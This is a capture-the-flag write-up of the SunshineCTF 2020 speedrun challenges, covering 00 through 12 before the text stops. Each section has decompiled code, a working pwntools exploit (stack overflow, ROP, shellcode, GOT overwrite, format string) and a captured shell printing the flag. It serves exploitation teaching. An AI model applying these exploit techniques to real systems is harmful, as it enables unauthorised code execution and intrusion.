# SunshineCTF 2020 Speedrun

Tags: _pwn_ _x86-64_ _x86_ _remote-shell_ _shellcode_ _bof_ _rop_ _got-
overwrite_ _format-string_ _rev_ _crypto_ _write-what-where_ _rand_

## Soapbox

More CTFs need to have simple speedruns to enable learning for n00bs and to
allow tool development and exploration quickly.  While I found these
challenges not challenging, it was still fun.  My advice:

1. Less to no shellcode.  Perhaps only one.  It's not as relevant as it used to be (perhaps with IoT it is, if that is the case, then give us MIPS, ARM, etc... challenges, and FFS, no more SPARC).  
2. Keep going.  I was looking forward to speedrun-100 with heap, FILE*, seccomp, srop, ret2ldresolve, etc... :-)

For n00b-n00bs (I'm still a n00b) reading this, I think this is one of the
best collection of starting points I've seen.  Thanks Sunshine.

## Final points/task

| points | speedrun | exploit |  
| --- | --- | --- |  
| 10 | [speedrun-00](#speedrun-00) | bof |  
| 10 | [speedrun-01](#speedrun-01) | bof |  
| 10 | [speedrun-02](#speedrun-02) | bof, rop, ret2win |  
| 10 | [speedrun-04](#speedrun-04) | bof |  
| 10 | [speedrun-05](#speedrun-05) | bof |  
| 18 | [speedrun-03](#speedrun-03) | bof, rop, shellcode |  
| 23 | [speedrun-06](#speedrun-06) | bof, shellcode |  
| 26 | [speedrun-07](#speedrun-07) | shellcode |  
| 29 | [speedrun-09](#speedrun-09) | rev, crypto |  
| 34 | [speedrun-10](#speedrun-10) | bof, rop |  
| 37 | [speedrun-08](#speedrun-08) | write-what-where, got-overwrite |  
| 42 | [speedrun-11](#speedrun-11) | format-string, got-overwrite |  
| 44 | [speedrun-13](#speedrun-13) | bof, rop |  
| 44 | [speedrun-16](#speedrun-16) | rev |  
| 45 | [speedrun-12](#speedrun-12) | format-string, got-overwrite |  
| 46 | [speedrun-15](#speedrun-15) | bof, rop, shellcode |  
| 46 | [speedrun-17](#speedrun-17) | rev, rand |  
| 47 | [speedrun-14](#speedrun-14) | bof, rop |

Above should be ordered by difficulty based on solved, however I assume some
were stuck on harder problems and did not look at some of the easier problems
released later in the CTF--assume a combination of difficulty and release
time.

## speedrun-00

### Checksec

```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

No stack canary, assume BOF.

### Decompile with Ghidra

```c  
void main(void)  
{  
 char local_48 [56];  
 int local_10;  
 int local_c;  
  
 puts("This is the only one");  
 gets(local_48);  
 if (local_c == 0xfacade) {  
   system("/bin/sh");  
 }  
 if (local_10 == 0xfacade) {  
   system("/bin/sh");  
 }  
 return;  
}  
```

A common theme throughout this write-up will be using the Ghidra variable
names as stack frame offsets.  E.g., `local_48` is `0x48` bytes offset from
the end of the stack frame (also where the return address is).

To target `local_c`, just write (`0x48 - 0xc`) bytes of garbage and then
`0xfacade` to overwrite `local_c`'s value.  Or, do the same for `local_10`.

It's also important to note the the binary is 64-bit and that `int` is 32-bit.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_00')

if not args.REMOTE:  
	p = process(binary.path)  
else:  
	p = remote('chal.2020.sunshinectf.org', 30000)

payload  = b''  
payload += (0x48 - 0xc) * b'A'  
payload += p32(0xfacade)

p.sendlineafter('This is the only one\n',payload)  
p.interactive()  
```

Output:

```bash  
# ./exploit_00.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-00/chall_00'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to chal.2020.sunshinectf.org on port 30000: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_00) gid=1000(chall_00) groups=1000(chall_00)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8392 Nov  7 07:49 chall_00  
-rw-r----- 1 root chall_00   35 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{burn-it-down-6208bbc96c9ffce4}  
```

## speedrun-01

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

No stack canary, assume BOF.

### Decompile with Ghidra

```c  
void main(void)  
{  
 char local_68 [64];  
 char local_28 [24];  
 int local_10;  
 int local_c;  
  
 puts("Long time ago, you called upon the tombstones");  
 fgets(local_28,0x13,stdin);  
 gets(local_68);  
 if (local_c == 0xfacade) {  
   system("/bin/sh");  
 }  
 if (local_10 == 0xfacade) {  
   system("/bin/sh");  
 }  
 return;  
}  
```

This is identical to [speedrun-00](#speedrun-00) with a different offset.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_01')

if not args.REMOTE:  
	p = process(binary.path)  
else:  
	p = remote('chal.2020.sunshinectf.org', 30001)

p.sendlineafter('Long time ago, you called upon the tombstones\n','foobar')

payload  = b''  
payload += (0x68 - 0xc) * b'A'  
payload += p32(0xfacade)

p.sendline(payload)  
p.interactive()  
```

Output:

```bash  
# ./exploit_01.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-01/chall_01'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to chal.2020.sunshinectf.org on port 30001: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_01) gid=1000(chall_01) groups=1000(chall_01)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8456 Nov  7 07:49 chall_01  
-rw-r----- 1 root chall_01   35 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{eternal-rest-6a5ee49d943a053a}  
```

## speedrun-02

### Checksec  
```  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
```

No stack canary, assume BOF; no PIE, assume ROP.

### Decompile with Ghidra

```c  
void vuln(void)  
{  
 char local_3e [54];  
  
__x86.get_pc_thunk.ax();  
 gets(local_3e);  
 return;  
}

void win(void)  
{  
 int iVar1;  
  
 iVar1 = __x86.get_pc_thunk.ax();  
 system((char *)(iVar1 + 0x12e));  
 return;  
}  
```

From `vuln`, `gets` can be used to overwrite the return address on the stack.
`local_3e` is `0x3e` bytes from the return address, so just write out `0x3e`
of garbage followed by the address for `win`.

The `system` call in `win` is actually `system("/bin/sh")`, to understand why
`iVar1 = __x86.get_pc_thunk.ax(); system((char *)(iVar1 + 0x12e));` equates to
that, read [ractf2020/nra#decompile-with-
ghidra](https://github.com/datajerk/ctf-write-
ups/tree/master/ractf2020/nra#decompile-with-ghidra).  In short, `iVar1` is
the address of the next instruction, then add `0x12e`, and then look in the
disassembly at the location for the string.  In this case it's `/bin/sh`.
Welcome to x86 (32-bits).

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_02')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30002)

p.sendlineafter('Went along the mountain side.\n','foobar')

payload  = b''  
payload += 0x3e * b'A'  
payload += p32(binary.sym.win)

p.sendline(payload)  
p.interactive()  
```

Output:

```bash  
# ./exploit_02.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-02/chall_02'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
[+] Opening connection to chal.2020.sunshinectf.org on port 30002: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_02) gid=1000(chall_02) groups=1000(chall_02)  
$ ls -l  
total 12  
-rwxr-xr-x 1 root root     7348 Nov  7 07:49 chall_02  
-rw-r----- 1 root chall_02   43 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{warmness-on-the-soul-3b6aad1d8bb54732}  
```

## speedrun-03

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
```

No stack canary + NX disabled + RWX segments = BOF shellcode.  Welcome to the
1990s.  Except for the PIE bit, that is 2005.  A bit odd to leave it there.

### Decompile with Ghidra

```c  
void vuln(void)  
{  
 char local_78 [112];  
  
 printf("I\'ll make it: %p\n",local_78);  
 gets(local_78);  
 return;  
}  
```

The `printf` statement leaks the address of `local_78` (on the stack with RWX
enabled).  `gets` can be used to received our shellcode and then overwrite the
return address with the address of our shellcode.

Just write out some shellcode, then pad with whatever until the return
address.  The pad length will be `0x78` (`local_78`, _starting to see a
pattern here?_) less the length of the shellcode.  Or put it after the return
address, `gets` has no limits.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_03')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30003)

p.sendlineafter('Just in time.\n','foobar')

p.recvuntil('I\'ll make it: ')  
_ = p.recvline().strip()  
stack = int(_,16)  
log.info('stack: ' + hex(stack))

payload  = b''  
payload += asm(shellcraft.sh())  
payload += (0x78 - len(payload)) * b'\x90'  
payload += p64(stack)

p.sendline(payload)  
p.interactive()  
```

Output:

```bash  
# ./exploit_03.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-03/chall_03'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
[+] Opening connection to chal.2020.sunshinectf.org on port 30003: Done  
[*] stack: 0x7fff1fc3e980  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_03) gid=1000(chall_03) groups=1000(chall_03)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8488 Nov  7 07:49 chall_03  
-rw-r----- 1 root chall_03   47 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{a-little-piece-of-heaven-26c8795afe7b3c49}  
```

## speedrun-04

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

No stack canary, assume BOF, however no need to smash the stack with this one.
No PIE, easy ROP.

### Decompile with Ghidra

```c  
void vuln(void)  
{  
 char local_48 [56];  
 code *local_10;  
  
 fgets(local_48,100,stdin);  
 (*local_10)();  
 return;  
}

void win(void)  
{  
 system("/bin/sh");  
 return;  
}  
```

Basic BOF.  Overrun `local_48` with `0x48 - 0x10` (`56`) bytes of garbage,
then the address to `win`.

> Notice the use of `fgets` vs. `gets`.  `fgets` is `gets` with limits,
> however setting that to `100` for a 56-byte array kinda defeats the purpose.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_04')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30004)

p.sendlineafter('Like some kind of madness, was taking control.\n','foobar')

payload  = b''  
payload += 56 * b'A'  
payload += p64(binary.sym.win)

p.sendline(payload)  
p.interactive()  
```

> That `56` was kinda sloppy of me, it should have been `(0x48 - 0x10)`.  Yes,
> still `56`, but with some meaning.

Output:

```bash  
# ./exploit_04.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-04/chall_04'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to chal.2020.sunshinectf.org on port 30004: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_04) gid=1000(chall_04) groups=1000(chall_04)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8440 Nov  7 07:49 chall_04  
-rw-r----- 1 root chall_04   39 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{critical-acclaim-96cfde3d068e77bf}  
```

## speedrun-05

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

No stack canary, assume BOF, however like the previous not necessary.  The
rest of the mitigations are in place.  For any type of ROP we'll need a leak.

### Decompile with Ghidra

```c  
void vuln(void)  
{  
 char local_48 [56];  
 code *local_10;  
  
 printf("Yes I\'m going to win: %p\n",main);  
 fgets(local_48,100,stdin);  
 (*local_10)();  
 return;  
}

void win(void)  
{  
 system("/bin/sh");  
 return;  
}  
```

`vuln` leaks the address of `main`, now we have the base process address and
can use that to write `win` to `local_10`.  This is not unlike the previous
challenge.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_05')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30005)

p.sendlineafter('Race, life\'s greatest.\n','foobar')

p.recvuntil('Yes I\'m going to win: ')  
_ = p.recvline().strip()  
main = int(_,16)  
binary.address = main - binary.sym.main  
log.info('binary.address: ' + hex(binary.address))

payload  = b''  
payload += 56 * b'A'  
payload += p64(binary.sym.win)

p.sendline(payload)  
p.interactive()  
```

> Again, that `56` was kinda sloppy (c&p job) of me, it should have been
> `(0x48 - 0x10)`.  Yes, still `56`, but with some meaning.

Output:

```bash  
# ./exploit_05.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-05/chall_05'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done  
[*] binary.address: 0x56475616e000  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_05) gid=1000(chall_05) groups=1000(chall_05)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8536 Nov  7 07:49 chall_05  
-rw-r----- 1 root chall_05   35 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{chapter-four-9ca97769b74345b1}  
```

## speedrun-06

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
```

No canary--BOF. No NX/Has RWX--shellcode. PIE enabled--no ROP without leak.

### Decompile with Ghidra

```c  
void main(void)  
{  
 char local_d8 [208];  
  
 printf("Letting my armor fall again: %p\n",local_d8);  
 fgets(local_d8,199,stdin);  
 vuln();  
 return;  
}

void vuln(void)  
{  
 char local_48 [56];  
 code *local_10;  
  
 puts("For saving me from all they\'ve taken.");  
 fgets(local_48,100,stdin);  
 (*local_10)();  
 return;  
}  
```

Not unlike the previous challenge, however no `win` function.  But with No
NX/Has RWX we can bring our own `win` function.

`main` leaks the stack and accepts our shellcode, `vuln` calls it.  To trigger
in `vuln` send `0x48 - 0x10` (56) bytes of garbage followed by the stack
address leak from `main`.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_06')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30006)

p.recvuntil('Letting my armor fall again: ')  
_ = p.recvline().strip()  
stack = int(_,16)  
log.info('stack: ' + hex(stack))

payload  = b''  
payload += asm(shellcraft.sh())

p.sendline(payload)

payload  = b''  
payload += 56 * b'A'  
payload += p64(stack)

p.sendlineafter('For saving me from all they\'ve taken.\n',payload)  
p.interactive()  
```

> Again, that `56` was kinda sloppy (c&p job) of me, it should have been
> `(0x48 - 0x10)`.  Yes, still `56`, but with some meaning.

Output:

```bash  
# ./exploit_06.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-06/chall_06'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
[+] Opening connection to chal.2020.sunshinectf.org on port 30006: Done  
[*] stack: 0x7ffc092ac690  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_06) gid=1000(chall_06) groups=1000(chall_06)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8464 Nov  7 07:49 chall_06  
-rw-r----- 1 root chall_06   39 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{shepherd-of-fire-1a78a8e600bf4492}  
```

## speedrun-07

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
```

Stack canary--no easy stack smashing. No NX/Has RWX--shellcode. PIE enabled--
no ROP without leak.

### Decompile with Ghidra

```c  
void main(void)  
{  
 long in_FS_OFFSET;  
 char local_f8 [32];  
 undefined local_d8 [200];  
 long local_10;  
  
 local_10 = *(long *)(in_FS_OFFSET + 0x28);  
 printf("In the land of raw humanity");  
 fgets(local_f8,0x13,stdin);  
 fgets(local_d8,200,stdin);  
 (*(code *)local_d8)();  
 if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
   __stack_chk_fail();  
 }  
 return;  
}  
```

Disappointedly easy.  Just put some shellcode into `local_d8`.  No math, no
thinking required.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_07')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30007)

p.sendline()

payload  = b''  
payload += asm(shellcraft.sh())

p.sendline(payload)  
p.interactive()  
```

> Ok, there was one tricky issue with this challenge.  Buffering.  There was
> no way to wait for the `printf` string, so I had to blindly just send a
> return.  This is not uncommon for pure shellcoding challenges were you just
> pipe something into `nc`.

Output:

```bash  
# ./exploit_07.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-07/chall_07'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
[+] Opening connection to chal.2020.sunshinectf.org on port 30007: Done  
[*] Switching to interactive mode  
In the land of raw humanity$ id  
uid=1000(chall_07) gid=1000(chall_07) groups=1000(chall_07)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8440 Nov  7 07:49 chall_07  
-rw-r----- 1 root chall_07   33 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{sidewinder-a80d0be1840663c4}  
```

## speedrun-08

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

No canary--BOF, No RELRO--GOT overwrite, and more..., No PIE--Easy ROP, GOT
overwrite.

### Decompile with Ghidra

```c  
void main(void)  
{  
 undefined8 local_18;  
 int local_c;  
  
 __isoc99_scanf(&%d,&local_c);  
 __isoc99_scanf(&%ld,&local_18);  
 *(undefined8 *)(target + (long)local_c * 8) = local_18;  
 puts("hi");  
 return;  
}

void win(void)  
{  
 system("/bin/sh");  
 return;  
}  
```

`main` is basically just a _write-what-where_, i.e., you can write any 64-bit
value you like in any RW segment.  And, well, the GOT (Global Offset Table)
`puts` entry is an easy target, just replace with `win` and get a shell when
`puts("hi")` is called.

Our write is relative to `target` (a global variable), so just subtract the
`target` address from the `puts` address and divide by 8 to compute the
_where_.  The _what_ is just `win`.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_08')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30008)

p.sendline(str((binary.got.puts - binary.sym.target) // 8))  
p.sendline(str(binary.sym.win))  
p.interactive()  
```

Output:

```bash  
# ./exploit_08.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-08/chall_08'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to chal.2020.sunshinectf.org on port 30008: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_08) gid=1000(chall_08) groups=1000(chall_08)  
$ ls -l  
total 12  
-rwxr-xr-x 1 root root     6816 Nov  7 07:49 chall_08  
-rw-r----- 1 root chall_08   30 Nov  7 08:51 flag.txt  
$ cat flag.txt  
sun{fiction-fa1a28a3ce2fdd96}  
```

## speedrun-09

### Checksec  
```  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

Finally, all mitigations in place.  BTW, you get this for free with `gcc`.
I.e. it actually takes effort to remove mitigations.  

> IMHO, all CTF pwns should use the `gcc` defaults, that is the most
> reasonable.

### Decompile with Ghidra

```c  
void main(void)  
{  
 size_t sVar1;  
 size_t sVar2;  
 long in_FS_OFFSET;  
 int local_5c;  
 byte local_58 [56];  
 long local_20;  
  
 local_20 = *(long *)(in_FS_OFFSET + 0x28);  
 fgets((char *)local_58,0x31,stdin);  
 sVar1 = strlen((char *)local_58);  
 sVar2 = strlen(key);  
 if (sVar1 == sVar2) {  
   local_5c = 0;  
   while( true ) {  
     sVar1 = strlen(key);  
     if (sVar1 <= (ulong)(long)local_5c) break;  
     if ((local_58[local_5c] ^ 0x30) != key[local_5c]) {  
       exit(0);  
     }  
     local_5c = local_5c + 1;  
   }  
   system("/bin/sh");  
 }  
 if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {  
   __stack_chk_fail();  
 }  
 return;  
}  
```

This is more of a reversing "crypto" challenge.  IANS, you need to enter a
value that when xor'd with `0x30` == `key` and then you get a shell.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_09')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30009)

p.send(xor(binary.string(binary.sym.key),b'\x30'))  
p.interactive()  
```

pwntools has you covered!

Output:

```bash  
# ./exploit_09.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-09/chall_09'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to chal.2020.sunshinectf.org on port 30009: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_09) gid=1000(chall_09) groups=1000(chall_09)  
$ ls -l  
total 16  
-rwxr-xr-x 1 root root     8648 Nov  7 07:49 chall_09  
-rw-r----- 1 root chall_09   34 Nov  7 08:52 flag.txt  
$ cat flag.txt  
sun{coming-home-4202dcd54b230a00}  
```

## speedrun-10

### Checksec  
```  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
```

No canary--BOF, No PIE--ROP.

### Decompile with Ghidra

```c  
void vuln(void)  
{  
 char local_3e [54];  
  
__x86.get_pc_thunk.ax();  
 gets(local_3e);  
 return;  
}

void win(int param_1)  
{  
 int iVar1;  
  
 iVar1 = __x86.get_pc_thunk.ax();  
 if (param_1 == -0x21524111) {  
   system((char *)(iVar1 + 0x12e));  
 }  
 return;  
}  
```

This is exactly the same as [speedrun-02](#speedrun-02) except that to get a
shell we need to pass an argument.  Since this is 32-bit we pass that on the
stack.  The arg needs to be `-0x21524111` (`0xdeadbeef`).

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_10')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30010)

p.sendlineafter('Don\'t waste your time, or...\n','foobar')

payload  = b''  
payload += 0x3e * b'A'  
payload += p32(binary.sym.win)  
payload += p32(0)  
payload += p32(0xdeadbeef)

p.sendline(payload)  
p.interactive()  
```

Just like [speedrun-02](#speedrun-02), `0x3e` (`local_3e` _remember?_) of
garbage followed by the location of `win`.  BUT... we need to setup a stack
frame as if we _called_ `win`.  For x86 (32-bit) the next parameter on the
stack needs to be the return address the function (`win`) will return to,
however, since we just want that sweet sweet `system` shell we don't really
care if the program crashes after we get the flag, so set to whatever you
like.  The last value we smash onto the stack is the first argument to
`win`--`0xdeadbeef`.

Output:

```bash  
# ./exploit_10.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-10/chall_10'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
[+] Opening connection to chal.2020.sunshinectf.org on port 30010: Done  
[*] Switching to interactive mode  
$ id  
uid=1000(chall_10) gid=1000(chall_10) groups=1000(chall_10)  
$ ls -l  
total 12  
-rwxr-xr-x 1 root root     7348 Nov  7 07:49 chall_10  
-rw-r----- 1 root chall_10   39 Nov  7 08:52 flag.txt  
$ cat flag.txt  
sun{second-heartbeat-aeaff82332769d0f}  
```

## speedrun-11

### Checksec  
```  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
```

Only NX enabled (no shellcode).  Anything else goes, BOF, ROP, GOT overwrite,
...

### Decompile with Ghidra

```c  
void vuln(void)  
{  
 char local_d4 [204];  
  
 fgets(local_d4,199,stdin);  
 printf(local_d4);  
 fflush(stdin);  
 return;  
}

void win(void)  
{  
 int iVar1;  
  
 iVar1 = __x86.get_pc_thunk.ax();  
 system((char *)(iVar1 + 0x15e));  
 return;  
}  
```

`vuln` reads up to 199 bytes into a 204-byte buffer, so no BOF today.  However
the vuln is the `printf` without a format string.  Format-string
vulnerabilities are very dangerous, it's basically a _write-what-where_ and
_read-what-where_.  With the size of the buffer you could completely alter the
behavior of the application.  E.g. change `fflush` in the GOT to `vuln`, then
you can `printf` all day, leak all the addresses, change it back, ROP the
stack, call `mmap`, setup some `RWX` memory, inject your malware, etc...

Anyway, for this task, just change `fflush` to `win` in the GOT.  Boom!

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_11')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30011)

p.sendline()

offset = 6  
payload = fmtstr_payload(offset,{binary.got.fflush:binary.sym.win})  
p.sendline(payload)

null = payload.find(b'\x00')  
p.recvuntil(payload[null-3:null])

p.interactive()  
```

Format-string exploits require a stack parameter offset.  In ~50% of cases it
is 6 (x86_64 and x86), however, finding it is not difficult.  Just enter
`%n$p` where `n > 0` as the argument to the `printf` call.  When the output
matches your input then you know you've found it, e.g.:

```  
# ./chall_11  
So indeed

%6$p  
0x70243625  
```

That hex is (in little endian order) is `%6$p`.

pwntools has some pretty nice format-string support.  If you're interested in
all the ways to exploit format strings read [dead-
canary](https://github.com/datajerk/ctf-write-
ups/tree/master/redpwnctf2020/dead-canary).

The two lines before `p.interactive()` are just to make the output pretty, it
basically captures our format-string exploit output and trashes it.

See what I mean?:

```bash  
# ./exploit_11.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-11/chall_11'  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
[+] Opening connection to chal.2020.sunshinectf.org on port 30011: Done  
[*] Switching to interactive mode

$ id  
uid=1000(chall_11) gid=1000(chall_11) groups=1000(chall_11)  
$ ls -l  
total 12  
-rwxr-xr-x 1 root root     5620 Nov  7 07:49 chall_11  
-rw-r----- 1 root chall_11   32 Nov  7 08:52 flag.txt  
$ cat flag.txt  
sun{afterlife-4b74753c2b12949f}  
```

Pretty.

## speedrun-12

### Checksec  
```  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

Same as [speedrun-11](#speedrun-11), but with PIE.

### Decompile with Ghidra

```c  
void main(undefined1 param_1)  
{  
 char local_24 [20];  
 undefined1 *local_10;  
  
 local_10 = &param_1;  
 printf("Just a single second: %p\n",main);  
 fgets(local_24,0x13,stdin);  
 vuln();  
 return;  
}

void vuln(void)  
{  
 char local_d4 [204];  
  
 fgets(local_d4,199,stdin);  
 printf(local_d4);  
 fflush(stdin);  
 return;  
}

void win(void)  
{  
 int iVar1;  
  
 iVar1 = __x86.get_pc_thunk.ax();  
 system((char *)(iVar1 + 0x167));  
 return;  
}  
```

Same as [speedrun-11](#speedrun-11), but with PIE, so we need to leak the base
process address.  `main` provides that leak.

### Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_12')

if not args.REMOTE:  
   p = process(binary.path)  
else:  
   p = remote('chal.2020.sunshinectf.org', 30012)

p.recvuntil('Just a single second: ')  
_ = p.recvline().strip()  
main = int(_,16)  
binary.address = main - binary.sym.main  
log.info('binary.address: ' + hex(binary.address))  
p.sendline()

offset = 6  
payload = fmtstr_payload(offset,{binary.got.fflush:binary.sym.win})  
p.sendline(payload)

null = payload.find(b'\x00')  
p.recvuntil(payload[null-3:null])

p.interactive()  
```

Output:

```bash  
# ./exploit_12.py REMOTE=1  
[*] '/pwd/datajerk/sunshinectf2020/speedrun-12/chall_12'  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to chal.2020.sunshinectf.org on port 30012: Done  
[*] binary.address: 0x565a8000  
[*] Switching to interactive mode  
V  
$ id  
uid=1000(chall_12) gid=1000(chall_12) groups=1000(chall_12)  
$ ls -l  
total 12  
-rwxr-xr-x 1 root root     5940 Nov  7 07:49 chall_12  
-rw-r----- 1 root chall_12   32 Nov  7 08:52 flag.txt  
$ cat flag.txt  
sun{the-stage-351efbcaebfda0d5}  
```

## speedrun-13

### Checksec  
```  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
```

Other than shellcode (NX), all options on the table.

### Decompile with Ghidra

